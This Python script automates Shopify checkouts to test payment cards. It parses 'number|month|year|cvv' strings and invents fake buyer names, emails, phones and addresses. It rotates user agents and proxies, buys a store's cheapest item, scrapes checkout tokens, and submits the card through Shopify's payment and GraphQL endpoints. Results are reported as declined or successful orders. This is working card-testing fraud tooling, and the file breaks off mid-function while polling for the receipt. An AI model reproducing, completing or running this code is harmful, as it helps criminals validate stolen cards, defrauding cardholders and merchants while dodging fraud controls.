import asyncio
import httpx
import re
import random
import json
from fake_useragent import UserAgent
from urllib.parse import urlparse
import time

def find_between(s, start, end):
    try:
        return (s.split(start))[1].split(end)[0]
    except:
        return ""

class ShopifyAuto:
    def __init__(self):
        self.ua = UserAgent()
        self.last_price = None
    
    async def get_random_info(self, session):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = [
            "2025550199", "3105551234", "4155559876", "6175550123",
            "9718081573", "2125559999", "7735551212", "4085556789"
        ]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

    async def get_state_abbreviation(self, state_name):
        """State abbreviation mapping"""
        state_dict = {
            "Alabama": "AL", "Alaska": "AK", "Arizona": "AZ", "Arkansas": "AR",
            "California": "CA", "Colorado": "CO", "Connecticut": "CT", "Delaware": "DE",
            "Florida": "FL", "Georgia": "GA", "Hawaii": "HI", "Idaho": "ID",
            "Illinois": "IL", "Indiana": "IN", "Iowa": "IA", "Kansas": "KS",
            "Kentucky": "KY", "Louisiana": "LA", "Maine": "ME", "Maryland": "MD",
            "Massachusetts": "MA", "Michigan": "MI", "Minnesota": "MN", "Mississippi": "MS",
            "Missouri": "MO", "Montana": "MT", "Nebraska": "NE", "Nevada": "NV",
            "New Hampshire": "NH", "New Jersey": "NJ", "New Mexico": "NM", "New York": "NY",
            "North Carolina": "NC", "North Dakota": "ND", "Ohio": "OH", "Oklahoma": "OK",
            "Oregon": "OR", "Pennsylvania": "PA", "Rhode Island": "RI", "South Carolina": "SC",
            "South Dakota": "SD", "Tennessee": "TN", "Texas": "TX", "Utah": "UT",
            "Vermont": "VT", "Virginia": "VA", "Washington": "WA", "West Virginia": "WV",
            "Wisconsin": "WI", "Wyoming": "WY"
        }
        state_name = state_name.title()
        return state_dict.get(state_name, "ME")

    async def extract_tokens_from_checkout(self, checkout_text):
        """COMPREHENSIVE token extraction using ALL methods from working scripts"""
        tokens = {}
        
        print("🔍 Comprehensive token extraction...")
        
        session_patterns = [
            'serialized-session-token" content="&quot;', '&quot;"',
            'session-token" content="', '"',
            '"sessionToken":"', '"',
            "'sessionToken':'", "'",
            'data-session-token="', '"'
        ]
        
        for i in range(0, len(session_patterns), 2):
            tokens['x_checkout_one_session_token'] = find_between(checkout_text, session_patterns[i], session_patterns[i+1])
            if tokens['x_checkout_one_session_token'] and len(tokens['x_checkout_one_session_token']) > 20:
                break

        tokens['queue_token'] = ""
        
        queue_token = find_between(checkout_text, '&quot;queueToken&quot;:&quot;', '&quot;')
        if queue_token and len(queue_token) > 10 and " " not in queue_token:
            tokens['queue_token'] = queue_token
            print("✅ Queue token found via sh.py method")
        
        if not tokens['queue_token']:
            queue_token = find_between(checkout_text, '"queueToken":"', '"')
            if queue_token and len(queue_token) > 10 and " " not in queue_token:
                tokens['queue_token'] = queue_token
                print("✅ Queue token found via JSON method")
        
        if not tokens['queue_token']:
            queue_token = find_between(checkout_text, "'queueToken':'", "'")
            if queue_token and len(queue_token) > 10 and " " not in queue_token:
                tokens['queue_token'] = queue_token
                print("✅ Queue token found via single quotes method")
        
        if not tokens['queue_token']:
            js_patterns = [
                r'window\.checkout.*?queueToken.*?["\']([^"\']+)["\']',
                r'checkout.*?queueToken.*?["\']([^"\']+)["\']',
                r'queueToken\s*=\s*["\']([^"\']+)["\']',
                r'"queue_token"\s*:\s*"([^"]+)"'
            ]
            for pattern in js_patterns:
                matches = re.findall(pattern, checkout_text, re.DOTALL)
                if matches and len(matches[0]) > 10 and " " not in matches[0]:
                    tokens['queue_token'] = matches[0]
                    print(f"✅ Queue token found via JS pattern: {pattern[:50]}...")
                    break
        
        if not tokens['queue_token']:
            script_patterns = [
                r'<script[^>]*>.*?window\.checkout\s*=\s*({[^}]+}).*?</script>',
                r'<script[^>]*>.*?checkout\s*=\s*({[^}]+}).*?</script>',
                r'window\.ShopifyCheckout\s*=\s*({[^<]+})'
            ]
            for pattern in script_patterns:
                matches = re.findall(pattern, checkout_text, re.DOTALL)
                for match in matches:
                    try:
                        json_str = match.replace("&quot;", '"')
                        data = json.loads(json_str)
                        if 'queueToken' in data:
                            tokens['queue_token'] = data['queueToken']
                            print("✅ Queue token found in script JSON")
                            break
                    except:
                        queue_match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', match)
                        if queue_match:
                            tokens['queue_token'] = queue_match.group(1)
                            print("✅ Queue token found in script string")
                            break
                if tokens['queue_token']:
                    break
        
        if not tokens['queue_token']:
            data_attrs = [
                'data-queue-token="', '"',
                'data-checkout-queue-token="', '"'
            ]
            for i in range(0, len(data_attrs), 2):
                queue_token = find_between(checkout_text, data_attrs[i], data_attrs[i+1])
                if queue_token and len(queue_token) > 10 and " " not in queue_token:
                    tokens['queue_token'] = queue_token
                    print("✅ Queue token found via data attribute")
                    break

        tokens['stable_id'] = find_between(checkout_text, 'stableId&quot;:&quot;', '&quot;')
        if not tokens['stable_id']:
            tokens['stable_id'] = find_between(checkout_text, '"stableId":"', '"')
        if not tokens['stable_id']:
            stable_matches = re.findall(r'"stableId"\s*:\s*"([^"]+)"', checkout_text)
            if stable_matches:
                tokens['stable_id'] = stable_matches[0]
        
        tokens['paymentMethodIdentifier'] = find_between(checkout_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        if not tokens['paymentMethodIdentifier']:
            tokens['paymentMethodIdentifier'] = find_between(checkout_text, '"paymentMethodIdentifier":"', '"')
        if not tokens['paymentMethodIdentifier']:
            payment_matches = re.findall(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
            if payment_matches:
                tokens['paymentMethodIdentifier'] = payment_matches[0]

        tokens['updated_total'] = ""
        total_patterns = [
            r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"([^"]+)"',
            r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*(\d+)',
            r'"total"\s*:\s*"([^"]+)"',
            r'"totalPrice"\s*:\s*"([^"]+)"',
            r'data-total-price="([^"]+)"',
            r'total_price["\s:]+([\d]+)',
        ]
        
        for pattern in total_patterns:
            matches = re.findall(pattern, checkout_text)
            if matches:
                for match in matches:
                    if match and match.isdigit() and len(match) > 2:
                        tokens['updated_total'] = match
                        print(f"✅ Updated total found: ${int(match)/100:.2f}")
                        break
                if tokens['updated_total']:
                    break
        
        if not tokens['updated_total']:
            try:
                checkout_data_match = re.search(r'window\.checkout\s*=\s*({[^}]+})', checkout_text)
                if checkout_data_match:
                    checkout_json = json.loads(checkout_data_match.group(1).replace("&quot;", '"'))
                    if 'totalPrice' in checkout_json:
                        tokens['updated_total'] = str(checkout_json['totalPrice'])
                        print(f"✅ Updated total from JSON: ${int(tokens['updated_total'])/100:.2f}")
            except:
                pass

        if not tokens['queue_token']:
            print("🔍 Performing deep queue token search...")
            uuid_patterns = [
                r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}',
                r'[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}',
            ]
            
            all_uuids = []
            for pattern in uuid_patterns:
                matches = re.findall(pattern, checkout_text)
                all_uuids.extend(matches)
            
            filtered_uuids = [uid for uid in all_uuids if uid != tokens.get('x_checkout_one_session_token', '') and uid != tokens.get('stable_id', '')]
            
            if filtered_uuids:
                from collections import Counter
                uuid_counts = Counter(filtered_uuids)
                most_common = uuid_counts.most_common(1)
                if most_common:
                    tokens['queue_token'] = most_common[0][0]
                    print(f"✅ Queue token found via UUID pattern: {tokens['queue_token'][:20]}...")

        return tokens

    async def get_product_info(self, session, site_url):
        """Get CHEAPEST available product from ALL products with pagination"""
        all_variants = []
        
        print("🔍 Scanning ALL products to find cheapest option...")
        
        urls_to_try = [
            f"{site_url}/products.json",
            f"{site_url}/collections/all/products.json"
        ]
        
        for base_url in urls_to_try:
            try:
                print(f"🔍 Trying endpoint: {base_url}")
                page = 1
                max_pages = 10
                consecutive_empty = 0
                endpoint_variants = 0
                
                while page <= max_pages:
                    url = f"{base_url}?page={page}&limit=250"
                    try:
                        response = await session.get(url)
                        if response.status_code != 200:
                            print(f"⚠️ Page {page} returned {response.status_code} at {base_url}")
                            break
                        
                        data = response.json()
                        products = data.get('products', [])
                        
                        if not products or len(products) == 0:
                            consecutive_empty += 1
                            if consecutive_empty >= 2:
                                print(f"✅ Reached end of products (2 consecutive empty pages)")
                                break
                            page += 1
                            continue
                        
                        consecutive_empty = 0
                        
                        for product in products:
                            product_title = product.get('title', 'Product')
                            variants = product.get('variants', [])
                            
                            for variant in variants:
                                if variant.get('available', False):
                                    try:
                                        price = variant.get('price', '1.00')
                                        if price and str(price).strip():
                                            price_float = float(price)
                                            price_cents = int(price_float * 100)
                                        else:
                                            price_cents = 100
                                        
                                        all_variants.append({
                                            'id': str(variant['id']),
                                            'title': product_title,
                                            'price': str(price_cents),
                                            'available': True,
                                            'price_value': price_cents
                                        })
                                        endpoint_variants += 1
                                    except (ValueError, TypeError):
                                        pass
                        
                        if len(products) < 250:
                            print(f"✅ Page {page} returned {len(products)} products (last page)")
                            break
                        
                        page += 1
                    except Exception as e:
                        print(f"⚠️ Error on page {page}: {e}, continuing...")
                        page += 1
                        continue
                
                if endpoint_variants > 0:
                    print(f"✅ Found {endpoint_variants} variants from {base_url}")
                else:
                    print(f"⚠️ No variants found at {base_url}")
                    
            except Exception as e:
                print(f"⚠️ {base_url} failed: {e}, trying next endpoint...")
                continue
        
        if all_variants:
            all_variants.sort(key=lambda x: x['price_value'])
            cheapest = all_variants[0]
            del cheapest['price_value']
            
            price_dollars = float(cheapest['price']) / 100
            print(f"✅ Found cheapest product: {cheapest['title']} - ${price_dollars:.2f}")
            print(f"   (Scanned {len(all_variants)} available variants from all endpoints)")
            
            return cheapest
        
        print("⚠️ No products found from any source, using fallback")
        return {
            'id': '39555780771934',
            'title': 'Default Product',
            'price': '100',
            'available': True
        }

    async def auto_shopify_charge(self, site_url, card_info, proxy=None):
        """Main function with COMPREHENSIVE token extraction"""
        cc, mes, ano, cvv = card_info.split("|")
        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]
        
        action_required_3ds = False
        
        print(f"🚀 Starting process on: {site_url}")
        print(f"💳 Card: {cc1} {cc2} {cc3} {cc4}")
        if proxy:
            print(f"🔌 Using proxy: {proxy[:30]}...")
        
        client_kwargs = {
            'timeout': 30.0,
            'follow_redirects': True,
            'headers': {'User-Agent': self.ua.random}
        }
        
        if proxy:
            client_kwargs['proxies'] = proxy
        
        async with httpx.AsyncClient(**client_kwargs) as session:
            
            try:
                print("\n📦 STEP 1: Finding product...")
                product_info = await self.get_product_info(session, site_url)
                if not product_info:
                    return "❌ No products found on this site"
                
                try:
                    price_dollars = float(product_info['price']) / 100
                    print(f"✅ Product: {product_info['title']} - ${price_dollars:.2f}")
                except (ValueError, TypeError):
                    print(f"✅ Product: {product_info['title']} - Price: {product_info['price']}")

                print("\n🛒 STEP 2: Adding to cart...")
                url = f"{site_url}/cart/add.js"
                
                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': site_url,
                    'referer': f"{site_url}/collections/all",
                    'user-agent': self.ua.random,
                    'x-requested-with': 'XMLHttpRequest'
                }

                form_data = {'id': product_info['id'], 'quantity': 1}
                response = await session.post(url, data=form_data, headers=headers)
                
                if response.status_code not in [200, 201]:
                    print(f"⚠️ First add to cart attempt failed: {response.status_code}")
                    
                    print("🔄 Trying alternative method (form POST)...")
                    url_alt = f"{site_url}/cart/add"
                    headers_alt = {
                        'authority': urlparse(site_url).netloc,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': site_url,
                        'referer': f"{site_url}/products/{product_info['id']}",
                        'user-agent': self.ua.random,
                    }
                    
                    form_data_alt = {
                        'form_type': 'product',
                        'utf8': '✓',
                        'id': product_info['id'],
                        'quantity': '1'
                    }
                    
                    response = await session.post(url_alt, data=form_data_alt, headers=headers_alt, follow_redirects=True)
                    
                    if response.status_code not in [200, 201, 302, 303]:
                        return f"❌ Failed to add to cart (both methods): {response.status_code}"
                
                print(f"✅ Add to cart: {response.status_code}")

                print("\n🔑 STEP 3: Getting cart token and total...")
                url = f"{site_url}/cart.js"
                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': '*/*',
                    'referer': f"{site_url}/cart",
                    'user-agent': self.ua.random,
                }

                response = await session.get(url, headers=headers)
                if response.status_code == 200:
                    cart_data = response.json()
                    token = cart_data.get("token")
                    cart_total = cart_data.get("total_price")
                    
                    if token:
                        print(f"✅ Cart token: {token[:20]}...")
                    else:
                        return "❌ Failed to get cart token"
                    
                    if cart_total is not None:
                        cart_total_cents = int(cart_total)
                        product_info['price'] = str(cart_total_cents)
                        
                        try:
                            total_dollars = cart_total_cents / 100
                            print(f"✅ Cart total: ${total_dollars:.2f}")
                            print(f"   (Raw cart value: {cart_total_cents} cents)")
                        except (ValueError, TypeError):
                            print(f"✅ Cart total: {cart_total}")
                    else:
                        print("⚠️ Could not get cart total, using product price")
                else:
                    return f"❌ Failed to get cart data: {response.status_code}"

                print("\n➡️ STEP 4: Processing checkout...")
                checkout_url = f"{site_url}/checkout"
                headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'referer': f"{site_url}/cart",
                    'user-agent': self.ua.random,
                }

                response = await session.get(checkout_url, headers=headers, follow_redirects=True)
                if response.status_code != 200:
                    return f"❌ Failed to access checkout: {response.status_code}"

                checkout_text = response.text

                tokens = await self.extract_tokens_from_checkout(checkout_text)

                print(f"✅ Session token: {tokens['x_checkout_one_session_token'][:20]}..." if tokens['x_checkout_one_session_token'] and len(tokens['x_checkout_one_session_token']) > 10 else "❌ Session token: INVALID")
                print(f"✅ Queue token: {tokens['queue_token'][:20]}..." if tokens['queue_token'] and len(tokens['queue_token']) > 10 else "❌ Queue token: INVALID")
                print(f"✅ Stable ID: {tokens['stable_id']}" if tokens['stable_id'] else "❌ Stable ID: MISSING")
                print(f"✅ Payment Method ID: {tokens['paymentMethodIdentifier']}" if tokens['paymentMethodIdentifier'] else "❌ Payment Method ID: MISSING")

                final_price = tokens.get('updated_total') or product_info['price']
                
                if not final_price or (isinstance(final_price, str) and not final_price.strip()):
                    final_price = product_info['price']
                
                try:
                    final_price_dollars = float(final_price) / 100
                    print(f"💰 Final price to charge: ${final_price_dollars:.2f}")
                except (ValueError, TypeError):
                    print(f"💰 Final price to charge: {final_price} cents")
                    try:
                        final_price = str(int(float(final_price or "100")))
                    except:
                        final_price = product_info['price']
                
                self.last_price = final_price

                missing_tokens = []
                if not tokens['x_checkout_one_session_token'] or len(tokens['x_checkout_one_session_token']) < 10:
                    missing_tokens.append('x_checkout_one_session_token')
                if not tokens['queue_token'] or len(tokens['queue_token']) < 10:
                    missing_tokens.append('queue_token')
                if not tokens['stable_id']:
                    missing_tokens.append('stable_id')
                if not tokens['paymentMethodIdentifier']:
                    missing_tokens.append('paymentMethodIdentifier')
                
                if missing_tokens:
                    return f"❌ Missing valid tokens: {', '.join(missing_tokens)}"

                await asyncio.sleep(1)

                print("\n💳 STEP 5: Creating payment session...")
                random_data = await self.get_random_info(session)
                fname = random_data["fname"]
                lname = random_data["lname"]
                email = random_data["email"]
                phone = random_data["phone"]
                add1 = random_data["add1"]
                city = random_data["city"]
                state_short = random_data["state_short"]
                zip_code = str(random_data["zip"])

                print(f"📍 Using address: {add1}, {city}, {state_short} {zip_code}")
                print(f"📞 Using phone: {phone}")

                url = "https://deposit.us.shopifycs.com/sessions"
                headers = {
                    'authority': 'deposit.us.shopifycs.com',
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://checkout.shopifycs.com',
                    'referer': 'https://checkout.shopifycs.com/',
                    'user-agent': self.ua.random,
                }

                json_data = {
                    'credit_card': {
                        'number': cc,
                        'month': mes,
                        'year': ano,
                        'verification_value': cvv,
                        'name': fname + ' ' + lname,
                    },
                    'payment_session_scope': urlparse(site_url).netloc,
                }

                response = await session.post(url, headers=headers, json=json_data)
                print(f"📡 Payment Session Response Status: {response.status_code}")
                
                if response.status_code != 200:
                    return f"⚠️ Error - Payment session failed (Status: {response.status_code})\nCannot verify card - site/network issue"

                session_data = response.json()
                print(f"📡 Payment Session Response: {json.dumps(session_data, indent=2)}")
                
                if "id" not in session_data:
                    if session_data.get("error") or session_data.get("errors"):
                        error_info = session_data.get("error") or session_data.get("errors")
                        return f"❌ Card DECLINED\nReason: {error_info}"
                    return f"⚠️ Error - No session ID returned\nResponse: {json.dumps(session_data, indent=2)[:500]}"
                
                sessionid = session_data["id"]
                
                if session_data.get("error") or session_data.get("errors"):
                    error_info = session_data.get("error") or session_data.get("errors")
                    return f"❌ Card DECLINED!\nReason: {error_info}"
                
                if session_data.get("status") == "failed" or session_data.get("state") == "failed":
                    return f"❌ Card DECLINED!\nSession status: {session_data.get('status') or session_data.get('state')}"
                
                print(f"✅ Payment session created: {sessionid}")
                print(f"✅ Card passed initial validation!")

                await asyncio.sleep(1)

                print("\n📡 STEP 6: Submitting GraphQL payment...")
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                
                graphql_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'pragma': 'no-cache',
                    'referer': f"{site_url}/",
                    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': self.ua.random,
                    'x-checkout-one-session-token': tokens['x_checkout_one_session_token'],
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-source-id': token,
                }

                price_amount = str(float(final_price) / 100) if final_price else "1.00"
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {
                                'sessionToken': tokens['x_checkout_one_session_token'],
                            },
                            'queueToken': tokens['queue_token'],
                            'discounts': {
                                'lines': [],
                                'acceptUnexpectedDiscounts': True,
                            },
                            'delivery': {
                                'deliveryLines': [
                                    {
                                        'selectedDeliveryStrategy': {
                                            'deliveryStrategyMatchingConditions': {
                                                'estimatedTimeInTransit': {
                                                    'any': True,
                                                },
                                                'shipments': {
                                                    'any': True,
                                                },
                                            },
                                            'options': {},
                                        },
                                        'targetMerchandiseLines': {
                                            'lines': [
                                                {
                                                    'stableId': tokens['stable_id'],
                                                },
                                            ],
                                        },
                                        'destination': {
                                            'streetAddress': {
                                                'address1': add1,
                                                'address2': '',
                                                'city': city,
                                                'countryCode': 'US',
                                                'postalCode': zip_code,
                                                'company': '',
                                                'firstName': fname,
                                                'lastName': lname,
                                                'zoneCode': state_short,
                                                'phone': phone,
                                            },
                                        },
                                        'deliveryMethodTypes': [
                                            'SHIPPING',
                                        ],
                                        'expectedTotalPrice': {
                                            'any': True,
                                        },
                                        'destinationChanged': True,
                                    },
                                ],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [
                                    {
                                        'stableId': tokens['stable_id'],
                                        'merchandise': {
                                            'productVariantReference': {
                                                'id': f'gid://shopify/ProductVariantMerchandise/{product_info["id"]}',
                                                'variantId': f'gid://shopify/ProductVariant/{product_info["id"]}',
                                                'properties': [],
                                                'sellingPlanId': None,
                                                'sellingPlanDigest': None,
                                            },
                                        },
                                        'quantity': {
                                            'items': {
                                                'value': 1,
                                            },
                                        },
                                        'expectedTotalPrice': {
                                            'any': True,
                                        },
                                        'lineComponentsSource': None,
                                        'lineComponents': [],
                                    },
                                ],
                            },
                            'payment': {
                                'totalAmount': {
                                    'any': True,
                                },
                                'paymentLines': [
                                    {
                                        'paymentMethod': {
                                            'directPaymentMethod': {
                                                'paymentMethodIdentifier': tokens['paymentMethodIdentifier'],
                                                'sessionId': sessionid,
                                                'billingAddress': {
                                                    'streetAddress': {
                                                        'address1': add1,
                                                        'address2': '',
                                                        'city': city,
                                                        'countryCode': 'US',
                                                        'postalCode': zip_code,
                                                        'company': '',
                                                        'firstName': fname,
                                                        'lastName': lname,
                                                        'zoneCode': state_short,
                                                        'phone': phone,
                                                    },
                                                },
                                                'cardSource': None,
                                            },
                                            'giftCardPaymentMethod': None,
                                            'redeemablePaymentMethod': None,
                                            'walletPaymentMethod': None,
                                            'walletsPlatformPaymentMethod': None,
                                            'localPaymentMethod': None,
                                            'paymentOnDeliveryMethod': None,
                                            'paymentOnDeliveryMethod2': None,
                                            'manualPaymentMethod': None,
                                            'customPaymentMethod': None,
                                            'offsitePaymentMethod': None,
                                            'customOnsitePaymentMethod': None,
                                            'deferredPaymentMethod': None,
                                            'customerCreditCardPaymentMethod': None,
                                            'paypalBillingAgreementPaymentMethod': None,
                                        },
                                        'amount': {
                                            'any': True,
                                        },
                                        'dueAt': None,
                                    },
                                ],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'company': '',
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {
                                        'value': email,
                                        'emailOrSmsChanged': False,
                                    },
                                },
                                'marketingConsent': [
                                    {
                                        'email': {
                                            'value': email,
                                        },
                                    },
                                ],
                                'shopPayOptInPhone': {
                                    'countryCode': 'US',
                                },
                            },
                            'tip': {
                                'tipLines': [],
                            },
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {
                                    'value': {
                                        'amount': '0',
                                        'currencyCode': 'USD',
                                    },
                                },
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {
                                'message': None,
                                'customAttributes': [],
                            },
                            'localizationExtension': {
                                'fields': [],
                            },
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {
                                'buyerRefusesDuties': False,
                            },
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                print(f"📡 GraphQL Response Status: {response.status_code}")
                
                if response.status_code != 200:
                    return f"❌ GraphQL request failed: {response.status_code}"

                result_data = response.json()
                print(f"📡 GraphQL Response: {json.dumps(result_data, indent=2)[:1000]}...")
                
                receipt_id = None
                has_errors = False
                error_codes = []
                
                if 'data' in result_data and result_data['data']:
                    completion = result_data['data'].get('submitForCompletion', {})
                    
                    if 'receipt' in completion and completion['receipt']:
                        receipt_id = completion['receipt'].get('id')
                        print(f"✅ Receipt ID extracted from receipt field: {receipt_id}")
                    
                    if completion.get('__typename') == 'Throttled':
                        print("⏳ Throttled response detected - payment is being processed...")
                        throttle_queue = completion.get('queueToken')
                        if throttle_queue:
                            print(f"✅ Throttle queue token: {throttle_queue[:20]}...")
                    
                    if 'errors' in completion and completion['errors']:
                        has_errors = True
                        errors = completion['errors']
                        error_codes = [e.get('code') for e in errors if 'code' in e]
                        print(f"⚠️ Errors returned: {error_codes}")
                        
                        if 'WAITING_PENDING_TERMS' in error_codes:
                            print("⏳ WAITING_PENDING_TERMS detected - attempting to proceed with checkout validation...")
                            has_errors = False
                        
                        non_pending_errors = [e for e in error_codes if e != 'WAITING_PENDING_TERMS']
                        if non_pending_errors:
                            error_msg = ', '.join(non_pending_errors)
                            return f"❌ Payment Rejected: {error_msg}"
                    
                    if completion.get('reason'):
                        return f"❌ Payment Failed: {completion['reason']}"
                
                if not receipt_id and not has_errors:
                    print("⚠️ No receipt ID found in initial response, checking alternative locations...")
                    if 'data' in result_data:
                        submit_data = result_data['data'].get('submitForCompletion')
                        if isinstance(submit_data, dict):
                            receipt_id = submit_data.get('id')
                            if receipt_id:
                                print(f"✅ Receipt ID extracted from alternative location: {receipt_id}")
                
                if not receipt_id and 'WAITING_PENDING_TERMS' in error_codes:
                    print("⏳ WAITING_PENDING_TERMS without receipt - attempting second submission...")
                    await asyncio.sleep(2)
                    
                    graphql_payload['variables']['attemptToken'] = f'{token}-{random.random()}'
                    
                    response2 = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                    if response2.status_code == 200:
                        result_data2 = response2.json()
                        print(f"📡 Second Attempt Response: {json.dumps(result_data2, indent=2)[:800]}...")
                        
                        if 'data' in result_data2 and result_data2['data']:
                            completion2 = result_data2['data'].get('submitForCompletion', {})
                            if 'receipt' in completion2 and completion2['receipt']:
                                receipt_id = completion2['receipt'].get('id')
                                if receipt_id:
                                    print(f"✅ Receipt ID extracted from second attempt: {receipt_id}")
                
                if receipt_id:
                    print(f"\n⏳ STEP 7: Polling for receipt status (Receipt ID: {receipt_id})...")
                    
                    poll_payload = {
                        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                        'variables': {
                            'receiptId': receipt_id,
                            'sessionToken': tokens['x_checkout_one_session_token'],
                        },
                        'operationName': 'PollForReceipt'
                    }
                    
                    max_polls = 7
                    for poll_attempt in range(max_polls):
                        await asyncio.sleep(2.5)
                        
                        print(f"🔍 Poll attempt {poll_attempt + 1}/{max_polls}...")
                        poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                        
                        if poll_response.status_code == 200:
                            poll_data = poll_response.json()
                            print(f"📡 Poll Response: {json.dumps(poll_data, indent=2)[:800]}...")
                            
                            if 'data' in poll_data and 'receipt' in poll_data['data']:
                                receipt = poll_data['data']['receipt']
                                
                                if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                                    order_token = receipt.get('token', 'N/A')
                                    redirect_url = receipt.get('redirectUrl', '')
                                    
                                    print(f"✅ Payment SUCCESSFUL! Order confirmed!")
                                    print(f"   Order ID: {order_id}")
                                    print(f"   Token: {order_token}")
                                    if redirect_url:
                                        print(f"   Redirect: {redirect_url}")
                                    
